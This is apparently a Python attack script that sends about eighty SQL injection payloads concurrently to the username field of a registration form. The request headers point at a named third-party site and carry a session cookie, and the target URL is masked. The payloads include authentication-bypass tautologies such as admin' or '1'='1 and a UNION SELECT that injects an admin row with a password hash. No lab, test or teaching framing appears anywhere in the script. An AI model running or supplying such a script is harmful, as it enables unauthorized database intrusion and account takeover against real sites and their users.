import requests
import concurrent.futures

url = '***'
headers = {
    'authority': 'global.om2.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,tr-TR;q=0.8,tr;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': 'lang=en; PHPSESSID=ca2a4a32f21b8de62b52a55db9cdd76c',
    'origin': 'https://global.om2.org',
    'referer': 'https://global.om2.org/users/register',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest'
}

prefixes = [
    "'-'",
    "' '",
    "'&'",
    "'^'",
    "'*'",
    " or ''-'",
    " or '' '",
    " or ''&'",
    " or ''^'",
    " or ''*'",
    '"-"',
    '" "',
    '"&"',
    '"^"',
    '"*"',
    ' or ""-"',
    ' or "" "',
    ' or ""&"',
    ' or ""^"',
    ' or ""*"',
    'or true--',
    '" or true--',
    '\' or true--',
    '") or true--',
    '\') or true--',
    '\' or \'x\'=\'x',
    '\') or (\'x\')=(\'x',
    '")) or (("x"))=(("x',
    '" or "x"="x',
    '") or ("x")=("x',
    '")) or (("x"))=(("x',
    'or 1=1',
    'or 1=1--',
    'or 1=1#',
    'or 1=1/*',
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='",
    "admin' or 1=1",
    "admin' or 1=1--",
    "admin' or 1=1#",
    "admin' or 1=1/*",
    "admin') or ('1'='1",
    "admin') or ('1'='1'--",
    "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*",
    "admin') or '1'='1",
    "admin') or '1'='1'--",
    "admin') or '1'='1'#",
    "admin') or '1'='1'/*",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    'admin" --',
    'admin" #',
    'admin"/*',
    'admin" or "1"="1',
    'admin" or "1"="1"--',
    'admin" or "1"="1"#',
    'admin" or "1"="1"/*',
    'admin"or 1=1 or ""="',
    'admin" or 1=1',
    'admin" or 1=1--',
    'admin" or 1=1#',
    'admin" or 1=1/*',
    'admin") or ("1"="1',
    'admin") or ("1"="1"--',
    'admin") or ("1"="1"#',
    'admin") or ("1"="1"/*',
    'admin") or "1"="1',
    'admin") or "1"="1"--',
    'admin") or "1"="1"#',
    'admin") or "1"="1"/*',
    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055"
]


def send_request(prefix):
    data = {
        'type': '1',
        'username': f'{prefix}cpahali1'
    }
    response = requests.post(url, headers=headers, data=data)
    return response.text

with concurrent.futures.ThreadPoolExecutor() as executor:
    results = executor.map(send_request, prefixes)

for result in results:
    print(result)
